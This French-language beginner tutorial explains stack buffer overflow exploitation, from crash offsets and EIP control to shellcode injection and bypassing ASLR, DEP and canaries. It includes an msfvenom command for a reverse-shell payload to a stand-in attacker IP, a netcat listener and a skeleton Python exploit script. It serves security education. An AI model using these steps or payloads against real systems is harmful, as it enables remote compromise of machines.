# Buffer Overflow (Dépassement de Tampon)

## Objectif
Comprendre et exploiter une faille de buffer overflow pour exécuter du code arbitraire sur une application vulnérable.

---

## Explications vulgarisées
- Un buffer overflow se produit quand un programme écrit plus de données dans une zone mémoire (buffer) que ce qui est prévu.
- Cela peut permettre à un attaquant d'écraser des variables, de détourner le flux d'exécution, voire d'exécuter son propre code (shellcode).
- **Analogie** : C'est comme remplir un verre d'eau : si tu continues à verser, ça déborde et l'eau va là où elle ne devrait pas !

---

## Schéma visuel du buffer overflow

Schéma textuel :
Entrée utilisateur
   ↓
Buffer mémoire
   ↓ (trop de données)
EIP/RIP (Instruction Pointer)
   ↓
Exécution du shellcode

---

## Étapes détaillées d'une exploitation

### 1. Identification de la vulnérabilité
- Utiliser un outil comme `pattern_create` de Metasploit pour générer une chaîne unique :
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
```
- Envoyer cette chaîne à l'application vulnérable (via netcat, un script Python, etc.).
- Observer le crash (segmentation fault) et récupérer la valeur du pointeur d'instruction (EIP/RIP).

### 2. Calcul de l'offset
- Utiliser `pattern_offset` pour trouver où le crash se produit :
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <valeur_EIP> -l 300
```
- **À quoi ça sert ?** Savoir exactement où injecter ton shellcode.

### 3. Contrôle de l'EIP/RIP
- Envoyer un buffer qui écrase l'EIP/RIP avec une valeur connue (ex : "AAAA").
- Vérifier dans un débogueur (gdb, Immunity Debugger) que l'EIP/RIP est bien contrôlé.

### 4. Injection d'un shellcode
- Générer un shellcode avec msfvenom :
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f python
```
- Remplacer la partie du buffer qui contrôle l'EIP/RIP par l'adresse de ton shellcode.
- Lancer un listener sur ta machine :
```bash
nc -nlvp 4444
```

### 5. Exploitation automatisée avec un script Python (exemple)
```python
#!/usr/bin/env python3
import socket

payload = b"A" * <offset> + <adresse_shellcode>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("target.com", 9999))
s.send(payload)
s.close()
```
- **Astuce débutant** : Utiliser pwntools pour automatiser l'envoi et le debug.

### 6. Contournement des protections modernes
- **ASLR** : Randomise l'adresse mémoire, nécessite des techniques comme le bruteforce ou les ret2libc.
- **DEP/NX** : Empêche l'exécution sur la stack, nécessite des ROP chains ou des gadgets.
- **Stack canaries** : Valeurs aléatoires pour détecter les débordements, nécessite de les contourner ou de les leak.

---

## Conseils pour débutants
- Toujours travailler sur des programmes de lab (ex : vulnserver, protostar, pwnable.kr).
- Bien comprendre la structure de la pile (stack) et le rôle de l'EIP/RIP.
- S'entraîner avec un débogueur pour visualiser le flux d'exécution.
- Attention aux protections modernes (ASLR, DEP, stack canaries).
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Ressources visuelles et pour aller plus loin
- [PayloadsAllTheThings - Buffer Overflow](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Buffer%20Overflow)
- [Exploit Education - Protostar](https://exploit.education/protostar/)
- [Pwntools](https://docs.pwntools.com/en/stable/)
- [HackTricks - Buffer Overflow](https://book.hacktricks.xyz/pentesting-web/buffer-overflow)
- [YouTube - Buffer Overflow Visualisé (LiveOverflow)](https://www.youtube.com/watch?v=1S0aBV-Waeo) 